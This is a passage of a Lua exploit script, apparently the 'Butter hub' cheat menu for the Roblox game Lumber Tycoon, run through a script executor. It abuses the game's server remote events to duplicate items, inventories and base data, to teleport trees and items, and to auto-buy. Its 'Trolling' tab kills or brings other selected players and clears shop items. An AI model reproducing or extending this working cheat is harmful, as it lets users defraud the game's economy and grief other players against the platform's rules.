                             local cf2 = cf + Vector3.new((v.Size.X/2) + 0.1, v.Size.Y - 1, (v.Size.Z/2) + 0.1)

                             if not v.Parent.PrimaryPart then
                                 v.Parent.PrimaryPart = v.Parent:FindFirstChild(ItemNameVal)
                             end

                             if getgenv().sortsortcancel then break end

                             if not FastTP then
                                 if not NRTP then
                                 game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Position + Vector3.new(0, 0, v.Size.Z + 3),v.Position + Vector3.new(1, 0, 0))
                                 wait(TimesSort)
                                 end
                             end


                             if FastTP then

                             if not v.Parent.ItemName.Value then return end

                             game:GetService("ReplicatedStorage").PlaceStructure.ClientPlacedStructure:FireServer(v.Parent.ItemName.Value, cf2, v.Parent.Owner.Value, nil, v.Parent, true)

                             else

                             if not NRTP then
                                 while not isnetworkowner(v) and not getgenv().sortsortcancel do
                                     game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v.Parent)
                                     task.wait()
                                 end

                                 game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v.Parent)
                             end

                                 v:PivotTo(cf2)

                             end

                             if FastTP then wait(1) else if not NRTP then wait(TimesSort) end end

                             RRSort = RRSort + 1

                             cf = cf + Vector3.new(v.Size.X + 0, 0, 0)
                             if math.floor(RRSort/XXSort) == RRSort/XXSort then
                             cf = cf - Vector3.new((v.Size.X + 0) * XXSort, 0, -v.Size.Z - 0)
                             end

                             if math.floor(RRSort/(ZZSort * XXSort)) == RRSort/(ZZSort * XXSort) then
                             cf = cf - Vector3.new(0, -v.Size.Y - 0, (v.Size.Z + 0) * ZZSort)
                         end
                     end



                 end
             end
         end
     end
     fixnames()
     FastTP = nil MainItem = nil sortstate = 0 SortDown:Disconnect() tests = {} sortbox:Destroy() camoff()
     notifications:message{Title = "Butter",Description = "Done in ".. string.format('%.1fs', tick() - sorttertime),Icon = 6023426926}
     end)
 end

  Sortertab1:Button("start", function()
  notifications:message{Title = "Butter",Description = "Click a Item",Icon = 6023426926}
  sort()
  end)




  --#endregion


  --#region DUPE tab

   --#region Mimir Dupe
  Dupetab01:Toggle('Mimir Maxland', '', false, function(Value)
      Mimir = Value
  end)

  Dupetab01:Slider('SlotNumber', '', 1, 1, 6,false, function(Value)
     SlotNumberML = Value
  end)

  SlotNumberML = 1

  Dupetab01:Button('Dupe', function()
     DataSize = DoesSaveExist(SlotNumberML)
     print("Data Size:", DataSize)
     Dupenumber = 35 * DataSize / 2
     print("Leave on:", math.round(Dupenumber))
     MaxDupe(math.round(Dupenumber), Mimir, SlotNumberML)
  end)


  --#region old BaseSize
  Dupetab02:Button('Tutorial', function()
     TutorialVid = "https://youtu.be/q1oDYIFoPcM"
     if not setclipboard(TutorialVid) then
         toclipboard(TutorialVid)
         else
         setclipboard(TutorialVid)
     end
     notifications:message{
         Title = "Butter",
         Description = "copied to clipboard",
         Icon = 6023426926
     }
 end)

  Dupetab02:Toggle('Mimir Maxland', '', false, function(Value)
      Mimir = Value
  end)

  Dupetab02:Dropdown('Base Size', "Select...", {"Small Base", "Medium Base", "Large Base"}, function(Value)
      BaseS = tostring(Value)
  end)

  Dupetab02:Slider('SlotNumber', '', 1, 1, 6,false, function(Value)
     SlotNumberMLO = Value
  end)

  Dupetab02:Button('Dupe', function()
      if BaseS == "Small Base" then
          LIT = 50
      elseif BaseS == "Medium Base" then
          LIT = 100
      elseif BaseS == "Large Base" then
          LIT = 200
      else
          notifications:message{
              Title = "Mimir",
              Description = "Pick a base size",
              Icon = 6023426926
          }
          return
      end
      MaxDupe(LIT, Mimir, SlotNumberMLO)
  end)
 --#endregion


  --#endregion


   --#region Time Dupe
  Dupetab0:Button('GET DUPE TIME', function()
      notifications:message{Title = "Butter",Description = "Load in a base.",Icon = 6023426926}
      getdupetime()
  end)

  Dupetab0:Toggle('I HAVE WATCHED THE YOUTUBE VID.', '', false, function(Value)
  YOUTUBEC = Value
  end)

  Dupetab0:Slider('Slot Number', '', 1, 1, 6 ,false, function(Value)
      slotnumber = Value
  end)

  slotnumber = 1

  Dupetab0:Slider('Time', '', 1, 1, 50 ,true, function(Value)
      dupewaittime = Value
  end)

  Dupetab0:Button('DUPE(THIS WILL START THE DUPE)', function()
      if YOUTUBEC then
      notifications:message{Title = "Butter",Description = "Dupe has started.",Icon = 6023426926}
      BaseDupe()
      else
      notifications:message{Title = "Butter",Description = "You have to check the box.",Icon = 6023426926}
      end
  end)
  --#endregion


   --#region Axe Dupe
  Dupetab1:Slider('Slot number', '', 0, 0, 6,false, function(Value)
  axeslot = Value
  end)

  Dupetab1:Slider('Wait Time', '', 0, 0, 15,true, function(Value)
  axetimewhitt = Value
  end)

  Dupetab1:Button('Dupe Inventory', function()
  AxeDupe(axeslot,axetimewhitt)
  end)
  --#endregion


   --#region Power dupe

 local Label = Dupetab2:Label("Slot receiving the power will be wiped")

 Dupetab2:Slider('To Slot number', '', 0, 0, 6,false, function(Value)
     ToSlot = Value
 end)

 Dupetab2:Button('Start PowerDupe', function()
     notifications:message{
         Title = "Butter",
         Description = "PowerDupe Started!",
         Icon = 6023426926
     }
     PowerDupe(ToSlot)
 end)

 local Label = Dupetab2:Label("Slot receiving the power will be wiped")
 --#endregion


   --#region Sign Dupe
  dropdownMSD = Dupetab3:Dropdown('Main', "Select...", playerList, function(Value)
  getgenv().Nameforsingdupe = Value
  end)

  Dupetab3:Slider('Best slot', '', 1, 1, 6,false, function(Value)
  getgenv().bestnummfordupe = Value
  end)


  Dupetab3:Toggle('Start', '', false, function(Value)
  getgenv().SoldSignAutoFarm = Value
  startnewdupe()
  end)

  Dupetab3:Button('Count SoldSigns', function()
  Signstuff()
  end)
  --#endregion

  --#endregion


  --#region Trolling tab

  Trollingtab1:Toggle('ClearAllShopItems', '', false, function(Value)
  ClearAllShopItems = Value
  if Value then
  ClearShopItems()
  end
  end)

  dropdownTB = Trollingtab1:Dropdown("Player", "Select...", playerList, function(Value)
  plrselected = Value
  end)

  Trollingtab1:Button('BringPlayer', function()
  BringPlayer()
  end)

  Trollingtab1:Button('KillPlayer', function()
  KillPlayer()
  end)

  --#endregion


  --#region Autobuy tab

  Autobuy1:Slider('Amount', '', 1, 1, 100,false, function(Value)
  AutoBuyAmount = Value
  end)

  AOpenbox = false

  Autobuy1:Toggle('Open box', '', false, function(Value)
  AOpenbox = Value
  end)

  Autobuy1:Dropdown("Select Item", "Select...", GrabShopItems(), function(Value)
  ItemToBuy = string.split(Value," - ")[1]
  return
  end)

  Autobuy1:Button("Phurchase Selected Item(s)", function()
  AutoBuy(ItemToBuy,AutoBuyAmount,AOpenbox)
  end)

  Autobuy1:Button("Abort Phurchasing", function()
  AbortAutoBuy = true
  end)


  Autobuy2:Button("Phurchase All Blueprints", function()
     for i,v in next, GetBlueprints() do
      AutoBuy(v,1,true,true)
     end
  end)

  Autobuy2:Button("Toll Bridge", function()
  Pay(15)
  end)

  Autobuy2:Button("Ferry Ticket", function()
  Pay(13)
  end)

  Autobuy2:Button("Power Of Ease", function()
  Pay(3)
  end)

  --#endregion


  --#region WOOD TAB

  Woodtab1:Dropdown("Select Tree", "Select...", {"Generic", "Walnut", "Cherry", "SnowGlow", "Oak", "Birch", "Koa", "Fir", "Volcano", "GreenSwampy", "CaveCrawler", "Palm", "GoldSwampy", "Frost", "Spooky", "SpookyNeon", "LoneCave",}, function(Value)
  getTree = Value
  return
  end)


  Woodtab1:Button("Bring Tree", function()
  BringTreetime = tick()
  if getTree == "LoneCave" then
     bringTree(getTree,true)
  else
     for i = 1,sdasdsad do
          wait()
          bringTree(getTree,false)
          ResizeBar(i,sdasdsad)
      end
  end
      notifications:message{Title = "Butter",Description = "Done in ".. string.format('%.1fs', tick() - BringTreetime),Icon = 6023426926}
      if getTree == "LoneCave" then
      GetToolsfix()
      end
  end)

  Woodtab1:Slider('Amount', '', 1, 1, 30,false, function(Value)
  sdasdsad = Value
  end)
  sdasdsad = 1

  --Woodtab1:Toggle('Infinite axe range', '', false, function(Value)
     --getgenv().Infeaxerange = Value
  --end)

  Woodtab1:Button("Abort", function()
  if getgenv().Infeaxerange then
     infhrp(true)
  end
  getgenv().treestop = false
  wait(5)
  getgenv().treestop = true
  end)

  --Woodtab1:Toggle('No axe cooldown', '', false, function(Value)
      --SetSwingCooldown(Value)
  --end)


  Woodtab2:Toggle('Cut Plank to one by one', '', false, function(Value)
  notifications:message{
  Title = "Butter",
  Description = "Click a plank cut one by one",
  Icon = 6023426926
  }
  UnitCutter = Value
  OneUnitCutter(Value)
  end)

  Woodtab2:Button("Bring All Logs", function()
  BringAllLogs()
  end)

  Woodtab2:Button("Sell All Logs", function()
  SellAllLogs()
  end)




  Woodtab3:Button("Mod Sawmill", function()
      ModSawmill()
  end)

  Woodtab3:Button("Mod Wood", function()
      ModWood()
  end)

  Woodtab4:Button('DickmemberTree', function()
  notifications:message{
  Title = "Butter",
  Description = "Click a Tree to Cut",
  Icon = 6023426926
  }
  DicmemberTree()
  end)

  Woodtab4:Toggle('View LoneCave Tree', '', false, function(Value)
  ViewEndTree(Value)
  end)

  --#endregion


  --#region Settings Tab

  Settingtab1:Button('Reset config', function()
     delfile("Butterv1.lua")
  end)

  Settingtab2:Slider('R', '', TheR, 0, 255, false, function(Value)
     TheR = Value
  end)

  Settingtab2:Slider('G', '', TheG, 0, 255, false, function(Value)
     TheG = Value
  end)

  Settingtab2:Slider('B', '', TheB, 0, 255, false, function(Value)
     TheB = Value
  end)

  Settingtab2:Button('Set', function()
     GameMenuTheme(Color3.fromRGB(25, 25, 25), Color3.fromRGB(TheR,TheG,TheB))
     SaveSettings()
  end)


  local SlotNamesOld = HttpService:JSONDecode(readfile('ButtersSlotNames.cfg'))

  local Player = game:GetService("Players").LocalPlayer

  function SaveSlotNames()
     game:GetService("Players").LocalPlayer.PlayerGui.LoadSaveGUI.SlotList.Visible = false
     game:GetService("Players").LocalPlayer.PlayerGui.MenuGUI.Open.Visible = true
     if isfile('ButtersSlotNames.cfg') then

       local DefaultSlotNames = {}
       DefaultSlotNames[tostring(Player)] = {
           Slot1Val = SSlot1,
           Slot2Val = SSlot2,
           Slot3Val = SSlot3,
           Slot4Val = SSlot4,
           Slot5Val = SSlot5,
           Slot6Val = SSlot6
       }

     writefile('ButtersSlotNames.cfg', HttpService:JSONEncode(DefaultSlotNames))
     end
  end

  SSlot1 = SlotNamesOld[tostring(Player)].Slot1Val
  Settingtab3:Textbox('Slot1', '', SlotNamesOld[tostring(Player)].Slot1Val, function(Value)
     SSlot1 = Value
     SaveSlotNames()
  end)


  SSlot2 = SlotNamesOld[tostring(Player)].Slot2Val
  Settingtab3:Textbox('Slot2', '', SlotNamesOld[tostring(Player)].Slot2Val, function(Value)
     SSlot2 = Value
     SaveSlotNames()
  end)

  SSlot3 = SlotNamesOld[tostring(Player)].Slot3Val
  Settingtab3:Textbox('Slot3', '', SlotNamesOld[tostring(Player)].Slot3Val, function(Value)
     SSlot3 = Value
     SaveSlotNames()
  end)

  SSlot4 = SlotNamesOld[tostring(Player)].Slot4Val
  Settingtab3:Textbox('Slot4', '', SlotNamesOld[tostring(Player)].Slot4Val, function(Value)
     SSlot4 = Value
     SaveSlotNames()
  end)

  SSlot5 = SlotNamesOld[tostring(Player)].Slot5Val
  Settingtab3:Textbox('Slot5', '', SlotNamesOld[tostring(Player)].Slot5Val, function(Value)
     SSlot5 = Value
     SaveSlotNames()
  end)

  SSlot6 = SlotNamesOld[tostring(Player)].Slot6Val
  Settingtab3:Textbox('Slot6', '', SlotNamesOld[tostring(Player)].Slot6Val, function(Value)
     SSlot6 = Value
     SaveSlotNames()
  end)

  task.spawn(function()
  while task.wait() do
  for i,v in pairs(Player.PlayerGui.LoadSaveGUI.SlotList.Main:GetDescendants()) do
  if v.Name == "SlotName" then if v.Text == "Slot 1" then v.Text = SSlot1 elseif v.Text == "Slot 2" then v.Text = SSlot2 elseif v.Text == "Slot 3" then v.Text = SSlot3
  elseif v.Text == "Slot 4" then v.Text = SSlot4 elseif v.Text == "Slot 5" then v.Text = SSlot5 elseif v.Text == "Slot 6" then v.Text = SSlot6 end end
  end
  end
  end)


  --#endregion


  --#region keybinds
  CAMisEnabled = false

  function toggleFeature()
  CAMisEnabled = not CAMisEnabled
  if CAMisEnabled then
  camon()
  else
  camoff()
  end
  end

  -- Connect the function to a keybind
  game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessedEvent)
  if gameProcessedEvent then return end -- Ignore input if another part of the game is using it
  if input.KeyCode == Enum.KeyCode.C then
  toggleFeature()
  end
  end)
  --#endregion


  --#region UpdateDropdowns
  local function UpdateDropdown()
     playerList = GetPlrs()
     dropdownTTP:SetOptions(playerList)
     dropdownTTPB:SetOptions(playerList)
     dropdownABP:SetOptions(playerList)
     dropdownTVTP:SetOptions(playerList)
     dropdownTVTPP:SetOptions(playerList)
     dropdownIO:SetOptions(playerList)
     dropdownSP:SetOptions(playerList)
     dropdownMSD:SetOptions(playerList)
     dropdownTB:SetOptions(playerList)
     dropdownTTP:SetOptions(playerList)
     dropdownCPP:SetOptions(playerList)
 end

 game.Players.PlayerRemoving:Connect(UpdateDropdown)
 game.Players.PlayerAdded:Connect(UpdateDropdown)
 --#endregion


  --#region math.random tips

  local tipsTable = {
      "Lumber Tycoon came out 15 years ago",
      "Butter hub has a Discord server https://discord.gg/butterhub",
      "The oldest GIFT in the game is the fire present",
      "The owner of butter Hub is kissbox and Gamer",
      "THANK YOU SO MUCH FOR 30K",
      "Butter is good",
      "Butter is on 1.36",
      "I Love you"
  }

  task.spawn(
      function()
          wait(5)
          local randomIndex = math.random(1, #tipsTable)
          local randomTip = tipsTable[randomIndex]

          notifications:message {
              Title = "Did you know",
              Description = randomTip,
              Icon = 6023426926
          }
      end
  )
  --#endregion

